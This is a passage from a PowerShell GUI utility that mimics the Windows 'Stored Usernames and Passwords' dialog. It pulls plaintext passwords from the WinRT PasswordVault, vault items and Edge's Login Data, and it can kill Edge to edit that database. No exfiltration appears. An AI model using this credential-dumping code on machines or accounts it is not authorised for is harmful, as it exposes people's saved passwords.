            ExpiringCertificates = ($certs | Where-Object { ((Get-Date) - $_.NotAfter).Days -lt 30 -and ((Get-Date) - $_.NotAfter).Days -ge 0 }).Count
            ExpiredCertificates = ($certs | Where-Object { ((Get-Date) - $_.NotAfter).Days -gt 0 }).Count
            ReportTime = Get-Date
        }

        return $report
    }
    catch {
        Write-Warning "Error generating credential audit report: $_"
        return $null
    }
}

# -------------------------------------------------------------
# 2. WINRT WEB VAULT UTILITIES
# -------------------------------------------------------------
$script:EnableCredentialManagerTrace = $false

function Write-TraceLog {
    param(
        [string]$Message
    )

    if ($script:EnableCredentialManagerTrace) {
        Write-Host $Message
    }
}

try {
    [Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType=WindowsRuntime] > $null
} catch {
    # WinRT type not available on this system
}

$Vault = $null
try {
    $Vault = New-Object Windows.Security.Credentials.PasswordVault
    Write-TraceLog "PasswordVault initialized successfully"
} catch {
    Write-Warning "Failed to initialize PasswordVault: $_"
    $Vault = $null
}

# Function to get credentials from cmdkey (diagnostic)
function Get-CmdkeyCredentials {
    $credentials = @()
    try {
        $output = & cmdkey /list 2>$null
        $currentCred = $null

        foreach ($line in $output) {
            $line = $line.Trim()

            if ($line -match "^\s*Target:\s*(.+)$") {
                if ($currentCred) { $credentials += $currentCred }
                $currentCred = @{ Target = $matches[1]; Type = ""; User = ""; Persistence = "" }
            }
            elseif ($line -match "^\s*Type:\s*(.+)$" -and $currentCred) {
                $currentCred.Type = $matches[1]
            }
            elseif ($line -match "^\s*User:\s*(.+)$" -and $currentCred) {
                $currentCred.User = $matches[1]
            }
            elseif ($line -match "^\s*Persistence:\s*(.+)$" -and $currentCred) {
                $currentCred.Persistence = $matches[1]
            }
            elseif (($line -match "Saved for this logon only" -or $line -match "Local machine persistence" -or $line -match "Enterprise persistence") -and $currentCred) {
                $currentCred.Persistence = $line
            }
        }
        if ($currentCred) { $credentials += $currentCred }
    } catch {
        Write-Warning "Error in Get-CmdkeyCredentials: $_"
    }
    return $credentials
}

# Parse vaultcmd.exe output to extract vault credentials
function Get-VaultcmdCredentials {
    $found = @()
    try {
        # First, get list of vaults
        $vaultOutput = & vaultcmd.exe /list 2>$null
        if (-not $vaultOutput) {
            Write-TraceLog "vaultcmd /list returned no output"
            return $found
        }

        # Parse vault names and GUIDs
        $vaults = @()
        $vaultName = $null
        $vaultGuid = $null

        foreach ($line in $vaultOutput) {
            if ($line -match "^\s*Vault:\s*(.+)$") {
                $vaultName = $matches[1].Trim()
            }
            elseif ($line -imatch "Vault Guid:([A-F0-9\-]+)") {
                $vaultGuid = $matches[1].Trim()
                if ($vaultName -and $vaultGuid) {
                    $vaults += @{Name = $vaultName; Guid = $vaultGuid}
                    Write-TraceLog "Found vault: $vaultName ($vaultGuid)"
                    $vaultName = $null
                    $vaultGuid = $null
                }
            }
        }

        # For each vault, list credentials
        foreach ($vault in $vaults) {
            try {
                Write-TraceLog "Querying vault: $($vault.Name)"
                $credsOutput = & vaultcmd.exe /listcreds:$($vault.Name) /all 2>$null

                if ($credsOutput) {
                    $credResource = $null
                    $credIdentity = $null
                    $credSchema = $null

                    foreach ($line in $credsOutput) {
                        if ($line -match "Credential schema:\s*(.+)$") {
                            $credSchema = $matches[1].Trim()
                        }
                        elseif ($line -match "^\s*Resource:\s*(.+)$") {
                            $credResource = $matches[1].Trim()
                        }
                        elseif ($line -match "^\s*Identity:\s*(.+)$") {
                            $credIdentity = $matches[1].Trim()
                        }
                        # When we hit an empty line or a new credential starts, save the previous one
                        elseif (($line -match "^$" -or $line -match "Credential schema:") -and $credResource -and $credIdentity) {
                            Write-TraceLog "  Found credential: $credResource / $credIdentity"
                            $found += [PSCustomObject]@{
                                Target = $credResource
                                Username = $credIdentity
                                Password = $null  # vaultcmd doesn't expose passwords
                                Type = $credSchema
                                VaultName = $vault.Name
                                VaultGuid = $vault.Guid
                            }
                            $credResource = $null
                            $credIdentity = $null
                            $credSchema = $null
                        }
                    }
                    # Don't forget the last credential
                    if ($credResource -and $credIdentity) {
                        Write-TraceLog "  Found credential: $credResource / $credIdentity"
                        $found += [PSCustomObject]@{
                            Target = $credResource
                            Username = $credIdentity
                            Password = $null
                            Type = $credSchema
                            VaultName = $vault.Name
                            VaultGuid = $vault.Guid
                        }
                    }
                }
            } catch {
                Write-Warning "Error querying vault $($vault.Name): $_"
            }
        }
    } catch {
        Write-Warning "Error in Get-VaultcmdCredentials: $_"
    }

    Write-TraceLog "Total vaultcmd credentials found: $($found.Count)"
    return $found
}

function Get-WebCredentials {
    $found = @()
    try {
        if ($null -eq $Vault) { 
            Write-TraceLog "Vault is null, skipping web credentials"
        } else {
            Write-TraceLog "Attempting to retrieve credentials from PasswordVault..."
            try {
                $creds = @($Vault.RetrieveAll())

                if ($null -eq $creds) {
                    Write-TraceLog "RetrieveAll() returned null"
                } else {
                    Write-TraceLog "RetrieveAll() returned collection with $($creds.Count) items"

                    foreach ($c in $creds) {
                        try {
                            Write-TraceLog "Processing credential: Resource=$($c.Resource), UserName=$($c.UserName)"
                            $c.RetrievePassword()
                            $found += [PSCustomObject]@{
                                Target = $c.Resource
                                Username = $c.UserName
                                Password = $c.Password
                                Type   = "Web"
                            }
                            Write-TraceLog "Successfully added web credential: $($c.Resource) / $($c.UserName)"
                        } catch {
                            Write-Warning "Failed to retrieve password for $($c.Resource): $_"
                        }
                    }
                }
            } catch {
                Write-Warning "Error calling RetrieveAll: $_"
            }
        }
    } catch {
        Write-Warning "Error in Get-WebCredentials: $_"
    }

    # Try searching for Snapshot credentials in vault schemas via Vault API
    Write-TraceLog "Searching for Snapshot credentials in Vault API..."
    try {
        $allVaults = Get-AllVaultGuids
        foreach ($vaultGuid in $allVaults) {
            try {
                $vaultMgr = New-Object VaultManager($vaultGuid)
                $items = $vaultMgr.EnumerateItems()

                foreach ($item in $items) {
                    if ($item.Resource -match "Snapshot" -or $item.FriendlyName -match "Snapshot" -or 
                        $item.Resource -match "MicrosoftStore" -or $item.FriendlyName -match "MicrosoftStore") {
                        Write-TraceLog "Found Snapshot credential in Vault: $($item.Resource)"
                        $found += [PSCustomObject]@{
                            Target = $item.Resource
                            Username = $item.Identity
                            Password = $item.Authenticator
                            Type   = "Vault/Web"
                        }
                    }
                }
                $vaultMgr.Dispose()
            } catch {
                # Ignore vault errors
            }
        }
    } catch {
        Write-Warning "Error searching vaults: $_"
    }

    Write-TraceLog "Total web credentials found: $($found.Count)"
    return $found
}

# -------------------------------------------------------------
# 3. INTERACTIVE TABBED USER INTERFACE CONSTRUCT
# -------------------------------------------------------------
$MainForm = New-Object System.Windows.Forms.Form
$MainForm.Text = "Stored Usernames and Passwords"
$MainForm.Size = New-Object System.Drawing.Size(560, 592)
$MainForm.StartPosition = "CenterScreen"
$MainForm.FormBorderStyle = "FixedDialog"
$MainForm.MaximizeBox = $False; $MainForm.MinimizeBox = $False
$MainForm.Font = New-Object System.Drawing.Font("Segoe UI", 9)
try {
    $CredwizPath = "$env:SystemRoot\System32\credwiz.exe"
    $MainForm.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($CredwizPath)
    $MainForm.ShowIcon = $True
} catch {}

$InfoLabel = New-Object System.Windows.Forms.Label
$InfoLabel.Text = "Windows can store log-on credentials for servers, websites and programs. When you revisit one of those locations, Windows will try to log you on automatically."
$InfoLabel.Location = New-Object System.Drawing.Point(12, 12)
$InfoLabel.Size = New-Object System.Drawing.Size(520, 60)
$MainForm.Controls.Add($InfoLabel)

$TabControl = New-Object System.Windows.Forms.TabControl
$TabControl.Location = New-Object System.Drawing.Point(12, 80)
$TabControl.Size = New-Object System.Drawing.Size(400, 360)
$MainForm.Controls.Add($TabControl)

# Tab Page 1: Web Credentials
$TabWeb = New-Object System.Windows.Forms.TabPage
$TabWeb.Text = "Web Credentials"
$TabControl.Controls.Add($TabWeb)

$ListViewWeb = New-Object System.Windows.Forms.ListView
$ListViewWeb.Dock = "Fill"
$ListViewWeb.View = "Details"
$ListViewWeb.FullRowSelect = $True; $ListViewWeb.MultiSelect = $False; $ListViewWeb.HeaderStyle = "Nonclickable"
[void]$ListViewWeb.Columns.Add("Resource / Website", 180)
[void]$ListViewWeb.Columns.Add("Identity Name", 180)
$TabWeb.Controls.Add($ListViewWeb)

# Tab Page 2: Windows Credentials
$TabWin = New-Object System.Windows.Forms.TabPage
$TabWin.Text = "Windows Credentials"
$TabWin.AutoScroll = $True
$TabControl.Controls.Add($TabWin)

function New-CredentialGrid($Title, $TopY) {
    $Lbl = New-Object System.Windows.Forms.Label
    $Lbl.Text = $Title
    $Lbl.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
    $Lbl.Location = New-Object System.Drawing.Point(5, $TopY)
    $Lbl.Size = New-Object System.Drawing.Size(350, 18)
    $TabWin.Controls.Add($Lbl)

    $LV = New-Object System.Windows.Forms.ListView
    $LV.Location = New-Object System.Drawing.Point(5, ($TopY + 20))
    $LV.Size = New-Object System.Drawing.Size(365, 80)
    $LV.View = "Details"
    $LV.FullRowSelect = $True; $LV.MultiSelect = $False; $LV.HeaderStyle = "Nonclickable"
    [void]$LV.Columns.Add("Logged on to", 180)
    [void]$LV.Columns.Add("User Name", 160)
    $TabWin.Controls.Add($LV)
    return $LV
}

$LV_WinCore = New-CredentialGrid "Windows Credentials" 10
$LV_WinCert = New-CredentialGrid "Certificate-Based Credentials" 115
$LV_WinGen  = New-CredentialGrid "Generic Credentials" 220

# --- Tab Page 3: Microsoft Edge Credentials ---
$TabEdge = New-Object System.Windows.Forms.TabPage
$TabEdge.Text = "Microsoft Edge"
$TabControl.Controls.Add($TabEdge)

$LblEdgeTabIntro = New-Object System.Windows.Forms.Label
$LblEdgeTabIntro.Text = "Passwords are read from Edge Chromium Login Data and written back to the live profile database when edited or removed."
$LblEdgeTabIntro.Location = New-Object System.Drawing.Point(8, 10)
$LblEdgeTabIntro.Size = New-Object System.Drawing.Size(360, 32)
$TabEdge.Controls.Add($LblEdgeTabIntro)

$LblEdgeTabFilter = New-Object System.Windows.Forms.Label
$LblEdgeTabFilter.Text = "Filter:"
$LblEdgeTabFilter.Location = New-Object System.Drawing.Point(8, 47)
$LblEdgeTabFilter.Size = New-Object System.Drawing.Size(40, 20)
$TabEdge.Controls.Add($LblEdgeTabFilter)

$TxtEdgeTabFilter = New-Object System.Windows.Forms.TextBox
$TxtEdgeTabFilter.Location = New-Object System.Drawing.Point(55, 44)
$TxtEdgeTabFilter.Size = New-Object System.Drawing.Size(313, 23)
$TabEdge.Controls.Add($TxtEdgeTabFilter)

$LV_EdgeTab = New-Object System.Windows.Forms.ListView
$LV_EdgeTab.Location = New-Object System.Drawing.Point(8, 75)
$LV_EdgeTab.Size = New-Object System.Drawing.Size(360, 250)
$LV_EdgeTab.View = "Details"
$LV_EdgeTab.FullRowSelect = $True
$LV_EdgeTab.MultiSelect = $False
$LV_EdgeTab.HeaderStyle = "Nonclickable"
[void]$LV_EdgeTab.Columns.Add("Profile", 70)
[void]$LV_EdgeTab.Columns.Add("Website", 90)
[void]$LV_EdgeTab.Columns.Add("Username", 55)
[void]$LV_EdgeTab.Columns.Add("Password", 65)
[void]$LV_EdgeTab.Columns.Add("Last Used", 45)
[void]$LV_EdgeTab.Columns.Add("Enc", 35)
$TabEdge.Controls.Add($LV_EdgeTab)

# --- Tab Page 4: Diagnostics (Redesigned Multi-Source View) ---
$TabDiag = New-Object System.Windows.Forms.TabPage
$TabDiag.Text = "Diagnostics"
$TabDiag.AutoScroll = $True
$TabControl.Controls.Add($TabDiag)

# Create a main container for better layout management
$DiagnosticPanel = New-Object System.Windows.Forms.Panel
$DiagnosticPanel.Dock = [System.Windows.Forms.DockStyle]::Fill
$DiagnosticPanel.AutoScroll = $True
$TabDiag.Controls.Add($DiagnosticPanel)

# ===== SECTION 1: Windows Credential Manager (cmdkey/DPAPI) =====
$LblWinCreds = New-Object System.Windows.Forms.Label
$LblWinCreds.Text = "Windows Credential Manager (cmdkey.exe / DPAPI)"
$LblWinCreds.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$LblWinCreds.Location = New-Object System.Drawing.Point(5, 5)
$LblWinCreds.Size = New-Object System.Drawing.Size(740, 20)
$DiagnosticPanel.Controls.Add($LblWinCreds)

$LV_WinCreds = New-Object System.Windows.Forms.ListView
$LV_WinCreds.Location = New-Object System.Drawing.Point(5, 25)
$LV_WinCreds.Size = New-Object System.Drawing.Size(740, 120)
$LV_WinCreds.View = "Details"
$LV_WinCreds.FullRowSelect = $True
$LV_WinCreds.MultiSelect = $False
$LV_WinCreds.HeaderStyle = "Nonclickable"
[void]$LV_WinCreds.Columns.Add("Source", 80)
[void]$LV_WinCreds.Columns.Add("Target", 200)
[void]$LV_WinCreds.Columns.Add("Username", 200)
[void]$LV_WinCreds.Columns.Add("Type", 80)
[void]$LV_WinCreds.Columns.Add("Status", 100)
$DiagnosticPanel.Controls.Add($LV_WinCreds)

# ===== SECTION 2: PasswordVault API (WinRT) =====
$LblPasswordVault = New-Object System.Windows.Forms.Label
$LblPasswordVault.Text = "PasswordVault API (WinRT / System.Windows.Security)"
$LblPasswordVault.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$LblPasswordVault.Location = New-Object System.Drawing.Point(5, 150)
$LblPasswordVault.Size = New-Object System.Drawing.Size(740, 20)
$DiagnosticPanel.Controls.Add($LblPasswordVault)

$LV_PasswordVault = New-Object System.Windows.Forms.ListView
$LV_PasswordVault.Location = New-Object System.Drawing.Point(5, 170)
$LV_PasswordVault.Size = New-Object System.Drawing.Size(740, 120)
$LV_PasswordVault.View = "Details"
$LV_PasswordVault.FullRowSelect = $True
$LV_PasswordVault.MultiSelect = $False
$LV_PasswordVault.HeaderStyle = "Nonclickable"
[void]$LV_PasswordVault.Columns.Add("Source", 80)
[void]$LV_PasswordVault.Columns.Add("Resource", 200)
[void]$LV_PasswordVault.Columns.Add("Username", 200)
[void]$LV_PasswordVault.Columns.Add("Count", 80)
[void]$LV_PasswordVault.Columns.Add("Status", 100)
$DiagnosticPanel.Controls.Add($LV_PasswordVault)

# ===== SECTION 3: Microsoft Edge (Chromium Login Data) =====
$LblEdgeDiagnostics = New-Object System.Windows.Forms.Label
$LblEdgeDiagnostics.Text = "Microsoft Edge (Chromium Login Data / winsqlite3.dll)"
$LblEdgeDiagnostics.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$LblEdgeDiagnostics.Location = New-Object System.Drawing.Point(5, 295)
$LblEdgeDiagnostics.Size = New-Object System.Drawing.Size(390, 20)
$DiagnosticPanel.Controls.Add($LblEdgeDiagnostics)

$LblEdgeFilter = New-Object System.Windows.Forms.Label
$LblEdgeFilter.Text = "Filter:"
$LblEdgeFilter.Location = New-Object System.Drawing.Point(468, 297)
$LblEdgeFilter.Size = New-Object System.Drawing.Size(40, 20)
$DiagnosticPanel.Controls.Add($LblEdgeFilter)

$TxtEdgeFilter = New-Object System.Windows.Forms.TextBox
$TxtEdgeFilter.Location = New-Object System.Drawing.Point(510, 294)
$TxtEdgeFilter.Size = New-Object System.Drawing.Size(235, 23)
$DiagnosticPanel.Controls.Add($TxtEdgeFilter)

$LV_EdgeDiagnostics = New-Object System.Windows.Forms.ListView
$LV_EdgeDiagnostics.Location = New-Object System.Drawing.Point(5, 315)
$LV_EdgeDiagnostics.Size = New-Object System.Drawing.Size(740, 120)
$LV_EdgeDiagnostics.View = "Details"
$LV_EdgeDiagnostics.FullRowSelect = $True
$LV_EdgeDiagnostics.MultiSelect = $False
$LV_EdgeDiagnostics.HeaderStyle = "Nonclickable"
[void]$LV_EdgeDiagnostics.Columns.Add("Profile", 130)
[void]$LV_EdgeDiagnostics.Columns.Add("Website", 180)
[void]$LV_EdgeDiagnostics.Columns.Add("Username", 110)
[void]$LV_EdgeDiagnostics.Columns.Add("Password", 170)
[void]$LV_EdgeDiagnostics.Columns.Add("Last Used", 100)
[void]$LV_EdgeDiagnostics.Columns.Add("Enc", 50)
$DiagnosticPanel.Controls.Add($LV_EdgeDiagnostics)

# ===== SECTION 4: Direct Vault Decryption (DPAPI + Policy.vpol / .vcrd) =====
$LblVaultDecryption = New-Object System.Windows.Forms.Label
$LblVaultDecryption.Text = "Direct Vault Decryption (Policy.vpol / .vcrd files)"
$LblVaultDecryption.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$LblVaultDecryption.Location = New-Object System.Drawing.Point(5, 440)
$LblVaultDecryption.Size = New-Object System.Drawing.Size(740, 20)
$DiagnosticPanel.Controls.Add($LblVaultDecryption)

$LV_VaultDecryption = New-Object System.Windows.Forms.ListView
$LV_VaultDecryption.Location = New-Object System.Drawing.Point(5, 460)
$LV_VaultDecryption.Size = New-Object System.Drawing.Size(740, 120)
$LV_VaultDecryption.View = "Details"
$LV_VaultDecryption.FullRowSelect = $True
$LV_VaultDecryption.MultiSelect = $False
$LV_VaultDecryption.HeaderStyle = "Nonclickable"
[void]$LV_VaultDecryption.Columns.Add("Source", 80)
[void]$LV_VaultDecryption.Columns.Add("Vault GUID", 230)
[void]$LV_VaultDecryption.Columns.Add("Resource", 200)
[void]$LV_VaultDecryption.Columns.Add("Count", 80)
[void]$LV_VaultDecryption.Columns.Add("Status", 100)
$DiagnosticPanel.Controls.Add($LV_VaultDecryption)

# ===== SECTION 5: vaultcmd.exe CLI Reference =====
$LblVaultcmd = New-Object System.Windows.Forms.Label
$LblVaultcmd.Text = "vaultcmd.exe CLI Reference (System-Protected Items)"
$LblVaultcmd.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$LblVaultcmd.Location = New-Object System.Drawing.Point(5, 585)
$LblVaultcmd.Size = New-Object System.Drawing.Size(740, 20)
$DiagnosticPanel.Controls.Add($LblVaultcmd)

$LV_Vaultcmd = New-Object System.Windows.Forms.ListView
$LV_Vaultcmd.Location = New-Object System.Drawing.Point(5, 605)
$LV_Vaultcmd.Size = New-Object System.Drawing.Size(740, 120)
$LV_Vaultcmd.View = "Details"
$LV_Vaultcmd.FullRowSelect = $True
$LV_Vaultcmd.MultiSelect = $False
$LV_Vaultcmd.HeaderStyle = "Nonclickable"
[void]$LV_Vaultcmd.Columns.Add("Source", 80)
[void]$LV_Vaultcmd.Columns.Add("Vault", 200)
[void]$LV_Vaultcmd.Columns.Add("Target", 200)
[void]$LV_Vaultcmd.Columns.Add("Username", 140)
[void]$LV_Vaultcmd.Columns.Add("Status", 80)
$DiagnosticPanel.Controls.Add($LV_Vaultcmd)

# ===== SECTION 6: Error Log =====
$LblErrors = New-Object System.Windows.Forms.Label
$LblErrors.Text = "Error Log"
$LblErrors.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$LblErrors.Location = New-Object System.Drawing.Point(5, 730)
$LblErrors.Size = New-Object System.Drawing.Size(740, 20)
$DiagnosticPanel.Controls.Add($LblErrors)

$LV_ErrorLog = New-Object System.Windows.Forms.ListView
$LV_ErrorLog.Location = New-Object System.Drawing.Point(5, 750)
$LV_ErrorLog.Size = New-Object System.Drawing.Size(740, 100)
$LV_ErrorLog.View = "Details"
$LV_ErrorLog.FullRowSelect = $True
$LV_ErrorLog.MultiSelect = $False
$LV_ErrorLog.HeaderStyle = "Nonclickable"
[void]$LV_ErrorLog.Columns.Add("Timestamp", 100)
[void]$LV_ErrorLog.Columns.Add("Source", 120)
[void]$LV_ErrorLog.Columns.Add("Error Message", 520)
$DiagnosticPanel.Controls.Add($LV_ErrorLog)

# Store references to new ListViews globally
$Global:DiagnosticListViews = @{
    'WinCreds'      = $LV_WinCreds
    'PasswordVault' = $LV_PasswordVault
    'Edge'          = $LV_EdgeDiagnostics
    'VaultDecrypt'  = $LV_VaultDecryption
    'Vaultcmd'      = $LV_Vaultcmd
    'ErrorLog'      = $LV_ErrorLog
}

$Global:EdgeCollection = @()
$Global:EdgeDiagnosticRows = @()

function Add-DiagnosticErrorLogEntry {
    param(
        [string]$Source,
        [object]$Message
    )

    try {
        if (-not $Global:DiagnosticListViews -or -not $Global:DiagnosticListViews.ContainsKey('ErrorLog')) {
            return
        }

        $errorList = $Global:DiagnosticListViews['ErrorLog']
        if ($null -eq $errorList -or $errorList.IsDisposed) {
            return
        }

        $messageText = if ($Message -is [System.Management.Automation.ErrorRecord]) {
            $Message.Exception.Message
        } elseif ($Message -is [System.Exception]) {
            $Message.Message
        } else {
            [string]$Message
        }

        $messageText = ($messageText -replace '[\r\n]+', ' ').Trim()
        $item = New-Object System.Windows.Forms.ListViewItem((Get-Date -Format 'HH:mm:ss'))
        [void]$item.SubItems.Add($Source)
        [void]$item.SubItems.Add($messageText)
        [void]$errorList.Items.Add($item)
    } catch {}
}

function Add-EdgeDiagnosticListViewItem {
    param(
        [Parameter(Mandatory=$true)]
        [System.Windows.Forms.ListView]$ListView,

        [Parameter(Mandatory=$true)]
        $CredentialRow
    )

    $lvItem = New-Object System.Windows.Forms.ListViewItem($CredentialRow.ProfileName)
    if ($CredentialRow.EncryptionVersion -eq 'ERROR') {
        $lvItem.ForeColor = [System.Drawing.Color]::Red
    } else {
        $lvItem.ForeColor = [System.Drawing.Color]::DarkCyan
    }

    [void]$lvItem.SubItems.Add($CredentialRow.Website)
    [void]$lvItem.SubItems.Add($CredentialRow.Username)
    [void]$lvItem.SubItems.Add($CredentialRow.Password)
    [void]$lvItem.SubItems.Add($CredentialRow.LastUsed)
    [void]$lvItem.SubItems.Add($CredentialRow.EncryptionVersion)
    $lvItem.Tag = $CredentialRow
    [void]$ListView.Items.Add($lvItem)
}

function Update-EdgeTabList {
    if ($null -eq $LV_EdgeTab -or $LV_EdgeTab.IsDisposed) {
        return
    }

    $LV_EdgeTab.BeginUpdate()
    try {
        $LV_EdgeTab.Items.Clear()

        $query = if ($null -ne $TxtEdgeTabFilter -and -not $TxtEdgeTabFilter.IsDisposed) { $TxtEdgeTabFilter.Text } else { '' }
        $rows = @($Global:EdgeCollection)

        if (-not [string]::IsNullOrWhiteSpace($query)) {
            $needle = $query.Trim().ToLowerInvariant()
            $rows = @($rows | Where-Object {
                ('' + $_.ProfileName).ToLowerInvariant().Contains($needle) -or
                ('' + $_.Website).ToLowerInvariant().Contains($needle) -or
                ('' + $_.Username).ToLowerInvariant().Contains($needle) -or
                ('' + $_.Password).ToLowerInvariant().Contains($needle) -or
                ('' + $_.EncryptionVersion).ToLowerInvariant().Contains($needle)
            })
        }

        if ($rows.Count -gt 0) {
            foreach ($row in $rows) {
                Add-EdgeDiagnosticListViewItem -ListView $LV_EdgeTab -CredentialRow $row
            }
        } else {
            $placeholderText = if ([string]::IsNullOrWhiteSpace($query)) { '[No Edge credentials found]' } else { '[No Edge entries match the current filter]' }
            $lvItem = New-Object System.Windows.Forms.ListViewItem($placeholderText)
            $lvItem.ForeColor = [System.Drawing.Color]::Gray
            [void]$lvItem.SubItems.Add('-')
            [void]$lvItem.SubItems.Add('-')
            [void]$lvItem.SubItems.Add('-')
            [void]$lvItem.SubItems.Add('INFO')
            [void]$LV_EdgeTab.Items.Add($lvItem)
        }
    }
    finally {
        $LV_EdgeTab.EndUpdate()
    }
}

function Get-SelectedEdgeTabRow {
    if ($null -eq $LV_EdgeTab -or $LV_EdgeTab.IsDisposed -or $LV_EdgeTab.SelectedIndices.Count -eq 0) {
        return $null
    }

    $item = $LV_EdgeTab.Items[$LV_EdgeTab.SelectedIndices[0]]
    if ($null -eq $item) {
        return $null
    }

    return $item.Tag
}

function Update-EdgeDiagnosticsList {
    if (-not $Global:DiagnosticListViews -or -not $Global:DiagnosticListViews.ContainsKey('Edge')) {
        return
    }

    $edgeList = $Global:DiagnosticListViews['Edge']
    if ($null -eq $edgeList -or $edgeList.IsDisposed) {
        return
    }

    $edgeList.BeginUpdate()
    try {
        $edgeList.Items.Clear()

        $query = if ($null -ne $TxtEdgeFilter -and -not $TxtEdgeFilter.IsDisposed) { $TxtEdgeFilter.Text } else { '' }
        $rows = @($Global:EdgeDiagnosticRows)

        if (-not [string]::IsNullOrWhiteSpace($query)) {
            $needle = $query.Trim().ToLowerInvariant()
            $rows = @($rows | Where-Object {
                ('' + $_.ProfileName).ToLowerInvariant().Contains($needle) -or
                ('' + $_.Website).ToLowerInvariant().Contains($needle) -or
                ('' + $_.Username).ToLowerInvariant().Contains($needle) -or
                ('' + $_.Password).ToLowerInvariant().Contains($needle) -or
                ('' + $_.EncryptionVersion).ToLowerInvariant().Contains($needle)
            })
        }

        if ($rows.Count -gt 0) {
            foreach ($row in $rows) {
                Add-EdgeDiagnosticListViewItem -ListView $edgeList -CredentialRow $row
            }
        } else {
            $placeholderText = if ([string]::IsNullOrWhiteSpace($query)) { '[No Edge profiles found]' } else { '[No Edge entries match the current filter]' }
            $lvItem = New-Object System.Windows.Forms.ListViewItem($placeholderText)
            $lvItem.ForeColor = [System.Drawing.Color]::Gray
            [void]$lvItem.SubItems.Add('-')
            [void]$lvItem.SubItems.Add('-')
            [void]$lvItem.SubItems.Add('-')
            [void]$lvItem.SubItems.Add('-')
            [void]$lvItem.SubItems.Add('INFO')
            [void]$edgeList.Items.Add($lvItem)
        }
    }
    finally {
        $edgeList.EndUpdate()
    }
}

function Get-SelectedEdgeDiagnosticRow {
    if ($null -eq $LV_EdgeDiagnostics -or $LV_EdgeDiagnostics.IsDisposed) {
        return $null
    }

    if ($LV_EdgeDiagnostics.SelectedIndices.Count -eq 0) {
        return $null
    }

    $item = $LV_EdgeDiagnostics.Items[$LV_EdgeDiagnostics.SelectedIndices[0]]
    if ($null -eq $item) {
        return $null
    }

    return $item.Tag
}

function Clear-DiagnosticSelections {
    param(
        [System.Windows.Forms.ListView]$ActiveListView
    )

    foreach ($listView in @($LV_WinCreds, $LV_PasswordVault, $LV_EdgeDiagnostics, $LV_VaultDecryption, $LV_Vaultcmd, $LV_ErrorLog)) {
        if ($null -ne $listView -and -not $listView.IsDisposed -and $listView -ne $ActiveListView) {
            $listView.SelectedIndices.Clear()
        }
    }

    $Global:LastFocusedGrid = $ActiveListView
    Update-ButtonStates
}

function Test-EdgeWritePreconditions {
    param(
        [Parameter(Mandatory=$true)]
        [string]$ActionVerb,

        [Parameter(Mandatory=$true)]
        $SelectedRow
    )

    if ($null -eq $SelectedRow -or [int64]$SelectedRow.LoginId -le 0 -or [string]::IsNullOrWhiteSpace($SelectedRow.ProfilePath)) {
        [System.Windows.Forms.MessageBox]::Show('The selected Edge credential does not contain writable database information.', 'Edge Diagnostics', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning) | Out-Null
        return $false
    }

    $running = $false
    try {
        $running = [EdgeDiagnosticsEngine]::IsEdgeRunning()
    } catch {}

    $message = "This action writes directly to the live Microsoft Edge 'Login Data' database for profile '$($SelectedRow.ProfileName)'.`n`n"
    if ($running) {
        $message += "Microsoft Edge is currently running and will be closed before the credential is $ActionVerb.`nUnsaved tabs or form data may be lost.`n`n"
    } else {
        $message += "Microsoft Edge is not currently running, but the credential will still be modified in the live profile database.`n`n"
    }
    $message += "Do you want to continue?"

    $result = [System.Windows.Forms.MessageBox]::Show($message, 'Edge Diagnostics Write Warning', [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Warning)
    if ($result -ne [System.Windows.Forms.DialogResult]::Yes) {
        return $false
    }

    if ($running) {
        try {
            [EdgeDiagnosticsEngine]::KillEdgeProcesses()
            Start-Sleep -Milliseconds 750
            if ([EdgeDiagnosticsEngine]::IsEdgeRunning()) {
                throw 'Microsoft Edge is still running after the close request.'
            }
        } catch {
            [System.Windows.Forms.MessageBox]::Show("Unable to close Microsoft Edge before the requested write operation.`n`n$_", 'Edge Diagnostics', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
            return $false
        }
    }

    return $true
}

function Show-EdgePropertyDialog {
    param(
        [Parameter(Mandatory=$true)]
        $SelectedObj
    )

    $propForm = New-Object System.Windows.Forms.Form
    $propForm.Text = 'Edit Edge Credential'
    $propForm.Size = New-Object System.Drawing.Size(430, 250)
    $propForm.StartPosition = 'CenterParent'
    $propForm.FormBorderStyle = 'FixedDialog'
    $propForm.MaximizeBox = $false
    $propForm.MinimizeBox = $false
    $propForm.Font = New-Object System.Drawing.Font('Segoe UI', 9)

    $lblProfile = New-Object System.Windows.Forms.Label
    $lblProfile.Text = 'Profile:'
    $lblProfile.Location = New-Object System.Drawing.Point(15, 20)
    $lblProfile.AutoSize = $true
    $propForm.Controls.Add($lblProfile)

    $txtProfile = New-Object System.Windows.Forms.TextBox
    $txtProfile.Location = New-Object System.Drawing.Point(120, 17)
    $txtProfile.Size = New-Object System.Drawing.Size(275, 23)
    $txtProfile.ReadOnly = $true
    $txtProfile.Text = $SelectedObj.ProfileName
    $propForm.Controls.Add($txtProfile)

    $lblWebsite = New-Object System.Windows.Forms.Label
    $lblWebsite.Text = 'Website:'
    $lblWebsite.Location = New-Object System.Drawing.Point(15, 55)
    $lblWebsite.AutoSize = $true
    $propForm.Controls.Add($lblWebsite)

    $txtWebsite = New-Object System.Windows.Forms.TextBox
    $txtWebsite.Location = New-Object System.Drawing.Point(120, 52)
    $txtWebsite.Size = New-Object System.Drawing.Size(275, 23)
    $txtWebsite.ReadOnly = $true
    $txtWebsite.Text = $SelectedObj.Website
    $propForm.Controls.Add($txtWebsite)

    $lblUsername = New-Object System.Windows.Forms.Label
    $lblUsername.Text = 'User name:'
    $lblUsername.Location = New-Object System.Drawing.Point(15, 90)
    $lblUsername.AutoSize = $true
